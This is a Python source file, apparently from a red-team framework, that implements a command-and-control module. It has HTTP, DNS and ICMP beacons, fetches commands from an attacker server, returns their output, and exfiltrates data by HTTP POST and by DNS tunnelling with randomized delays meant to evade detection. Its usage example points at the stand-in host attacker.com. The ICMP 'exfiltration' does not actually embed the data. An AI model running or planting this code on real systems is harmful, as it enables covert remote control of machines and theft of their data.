"""
Command & Control (C2) Communication Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The C2 Communication module establishes command and control channels for post-exploitation
operations. It provides multiple communication methods including HTTP, DNS, ICMP, and
encrypted channels for maintaining persistence and exfiltrating data.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.c2_communication import C2Communication
    
    # Initialize logger and module
    logger = FrameworkLogger("c2")
    c2 = C2Communication(logger, c2_server="http://attacker.com")
    
    # Establish HTTP beacon
    beacon = c2.establish_http_beacon(interval=60)
    print(f"Beacon established: {beacon['status']}")
    
    # Send command request
    command = c2.request_command()
    print(f"Command received: {command['command']}")
    
    # Execute command and send results
    result = c2.send_command_result(command_id="cmd_123", output="ls -la")
    
    # Exfiltrate data via DNS tunneling
    exfil = c2.exfiltrate_dns(data="sensitive_data", domain="attacker.com")
    
    # Establish encrypted channel
    encrypted = c2.establish_encrypted_channel(key="encryption_key")

Red Team Use Cases:
- Maintaining persistent access
- Command and control communication
- Data exfiltration
- Remote command execution
- Evading network detection
- Multi-stage payload delivery
"""

from typing import Dict, List, Optional
import time
import socket
import base64
import requests
import hashlib
import subprocess
import platform
import random
from urllib.parse import urlparse
from utils.logger import FrameworkLogger


class C2Communication:
    """Command and control communication module"""
    
    def __init__(self, logger: FrameworkLogger, c2_server: str):
        """
        Initialize C2 communication module
        
        Args:
            logger: Logger instance
            c2_server: C2 server URL or IP
        """
        self.logger = logger
        self.c2_server = c2_server
        self.beacon_active = False
        self.last_beacon = None
        self.command_queue = []
        self.communication_history = []
    
    def establish_http_beacon(self, interval: int = 60, endpoint: str = "/beacon") -> Dict:
        """
        Establish HTTP beacon for C2 communication
        
        Args:
            interval: Beacon interval in seconds
            endpoint: C2 endpoint path
        
        Returns:
            Dictionary containing beacon status
        """
        self.logger.info(f"Establishing HTTP beacon to {self.c2_server}")
        
        try:
            url = f"{self.c2_server}{endpoint}"
            payload = {
                "hostname": socket.gethostname(),
                "timestamp": time.time(),
                "status": "checkin"
            }
            
            response = requests.post(url, json=payload, timeout=10, verify=False)
            
            if response.status_code == 200:
                self.beacon_active = True
                self.last_beacon = time.time()
                
                # Check for commands in response
                if "command" in response.json():
                    self.command_queue.append(response.json()["command"])
                
                return {
                    "status": "active",
                    "interval": interval,
                    "server": self.c2_server,
                    "last_beacon": self.last_beacon,
                    "commands_pending": len(self.command_queue)
                }
            else:
                return {
                    "status": "failed",
                    "error": f"HTTP {response.status_code}",
                    "server": self.c2_server
                }
                
        except Exception as e:
            self.logger.error(f"HTTP beacon failed: {e}")
            return {
                "status": "failed",
                "error": str(e),
                "server": self.c2_server
            }
    
    def establish_dns_beacon(self, domain: str, interval: int = 60) -> Dict:
        """
        Establish DNS beacon for C2 communication
        
        Args:
            domain: Domain for DNS queries
            interval: Beacon interval in seconds
        
        Returns:
            Dictionary containing DNS beacon status
        """
        self.logger.info(f"Establishing DNS beacon using {domain}")
        
        try:
            # Generate unique subdomain
            hostname = socket.gethostname()
            subdomain = hashlib.md5(f"{hostname}{time.time()}".encode()).hexdigest()[:16]
            query_domain = f"{subdomain}.{domain}"
            
            # Perform DNS query
            import socket as socket_lib
            socket_lib.gethostbyname(query_domain)
            
            self.beacon_active = True
            self.last_beacon = time.time()
            
            return {
                "status": "active",
                "domain": domain,
                "query_domain": query_domain,
                "interval": interval,
                "last_beacon": self.last_beacon
            }
            
        except Exception as e:
            self.logger.error(f"DNS beacon failed: {e}")
            return {
                "status": "failed",
                "error": str(e),
                "domain": domain
            }
    
    def establish_icmp_beacon(self, target_ip: str, interval: int = 60) -> Dict:
        """
        Establish ICMP beacon for C2 communication
        
        Args:
            target_ip: Target IP for ICMP packets
            interval: Beacon interval in seconds
        
        Returns:
            Dictionary containing ICMP beacon status
        """
        self.logger.info(f"Establishing ICMP beacon to {target_ip}")
        
        try:
            # Send ICMP packet with encoded data
            hostname = socket.gethostname()
            data = base64.b64encode(hostname.encode()).decode()
            
            # Use ping with data (OS dependent)
            if platform.system() == "Windows":
                cmd = f'ping -n 1 -l 32 {target_ip}'
            else:
                cmd = f'ping -c 1 -s 32 {target_ip}'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            
            if result.returncode == 0:
                self.beacon_active = True
                self.last_beacon = time.time()
                
                return {
                    "status": "active",
                    "target_ip": target_ip,
                    "interval": interval,
                    "last_beacon": self.last_beacon
                }
            else:
                return {
                    "status": "failed",
                    "error": "ICMP packet failed"
                }
                
        except Exception as e:
            self.logger.error(f"ICMP beacon failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def request_command(self) -> Dict:
        """
        Request command from C2 server
        
        Returns:
            Dictionary containing command information
        """
        try:
            url = f"{self.c2_server}/command"
            payload = {
                "hostname": socket.gethostname(),
                "timestamp": time.time(),
                "status": "ready"
            }
            
            response = requests.get(url, json=payload, timeout=10, verify=False)
            
            if response.status_code == 200:
                command_data = response.json()
                return {
                    "status": "received",
                    "command": command_data.get("command"),
                    "command_id": command_data.get("id"),
                    "timestamp": time.time()
                }
            else:
                return {
                    "status": "no_command",
                    "timestamp": time.time()
                }
                
        except Exception as e:
            self.logger.error(f"Command request failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def send_command_result(self, command_id: str, output: str, exit_code: int = 0) -> Dict:
        """
        Send command execution result to C2 server
        
        Args:
            command_id: Command identifier
            output: Command output
            exit_code: Command exit code
        
        Returns:
            Dictionary containing send status
        """
        try:
            url = f"{self.c2_server}/result"
            payload = {
                "command_id": command_id,
                "output": base64.b64encode(output.encode()).decode(),
                "exit_code": exit_code,
                "timestamp": time.time()
            }
            
            response = requests.post(url, json=payload, timeout=10, verify=False)
            
            return {
                "status": "sent" if response.status_code == 200 else "failed",
                "command_id": command_id,
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"Failed to send command result: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def exfiltrate_http(self, data: str, endpoint: str = "/exfil") -> Dict:
        """
        Exfiltrate data via HTTP POST
        
        Args:
            data: Data to exfiltrate
            endpoint: C2 endpoint path
        
        Returns:
            Dictionary containing exfiltration status
        """
        try:
            url = f"{self.c2_server}{endpoint}"
            payload = {
                "data": base64.b64encode(data.encode()).decode(),
                "hostname": socket.gethostname(),
                "timestamp": time.time()
            }
            
            response = requests.post(url, json=payload, timeout=10, verify=False)
            
            return {
                "status": "success" if response.status_code == 200 else "failed",
                "method": "http",
                "size": len(data),
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"HTTP exfiltration failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def exfiltrate_dns(self, data: str, domain: str) -> Dict:
        """
        Exfiltrate data via DNS tunneling
        
        Args:
            data: Data to exfiltrate
            domain: Domain for DNS queries
        
        Returns:
            Dictionary containing exfiltration status
        """
        try:
            # Encode data as base64
            encoded = base64.b64encode(data.encode()).decode()
            
            # Split into chunks (DNS labels max 63 chars)
            chunk_size = 50
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                # Stealthy delay between DNS queries
                if i > 0:
                    delay = random.uniform(0.1, 0.5)  # Random delay 100-500ms
                    time.sleep(delay)
                
                subdomain = f"{i:04d}-{chunk}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                except Exception:
                    pass
            
            return {
                "status": "success",
                "method": "dns",
                "chunks": len(chunks),
                "size": len(data),
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"DNS exfiltration failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def exfiltrate_icmp(self, data: str, target_ip: str) -> Dict:
        """
        Exfiltrate data via ICMP tunneling
        
        Args:
            data: Data to exfiltrate
            target_ip: Target IP for ICMP packets
        
        Returns:
            Dictionary containing exfiltration status
        """
        try:
            # Encode data
            encoded = base64.b64encode(data.encode()).decode()
            
            # Split into chunks (ICMP payload limited)
            chunk_size = 32
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                # Stealthy delay between ICMP packets
                if i > 0:
                    delay = random.uniform(0.2, 0.5)  # Random delay 200-500ms
                    time.sleep(delay)
                
                if platform.system() == "Windows":
                    cmd = f'ping -n 1 -l {len(chunk)} {target_ip}'
                else:
                    cmd = f'ping -c 1 -s {len(chunk)} {target_ip}'
                
                subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
            
            return {
                "status": "success",
                "method": "icmp",
                "chunks": len(chunks),
                "size": len(data),
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"ICMP exfiltration failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def establish_encrypted_channel(self, key: str, algorithm: str = "xor") -> Dict:
        """
        Establish encrypted communication channel
        
        Args:
            key: Encryption key
            algorithm: Encryption algorithm (xor, aes)
        
        Returns:
            Dictionary containing channel status
        """
        self.logger.info(f"Establishing encrypted channel ({algorithm})")
        
        try:
            # Simple XOR encryption for demonstration
            if algorithm == "xor":
                self.encryption_key = key
                self.encryption_algorithm = "xor"
                
                return {
                    "status": "established",
                    "algorithm": algorithm,
                    "encrypted": True,
                    "timestamp": time.time()
                }
            else:
                return {
                    "status": "unsupported",
                    "error": f"Algorithm {algorithm} not implemented"
                }
                
        except Exception as e:
            self.logger.error(f"Encrypted channel failed: {e}")
            return {
                "status": "failed",
                "error": str(e)
            }
    
    def encrypt_data(self, data: str) -> str:
        """Encrypt data using established channel"""
        if hasattr(self, 'encryption_algorithm') and self.encryption_algorithm == "xor":
            key = self.encryption_key.encode()
            return ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(data))
        return data
    
    def decrypt_data(self, encrypted_data: str) -> str:
        """Decrypt data using established channel"""
        return self.encrypt_data(encrypted_data)  # XOR is symmetric
    
    def get_beacon_status(self) -> Dict:
        """Get current beacon status"""
        return {
            "active": self.beacon_active,
            "last_beacon": self.last_beacon,
            "server": self.c2_server,
            "commands_pending": len(self.command_queue)
        }
    
    def get_communication_history(self) -> List[Dict]:
        """Get communication history"""
        return self.communication_history

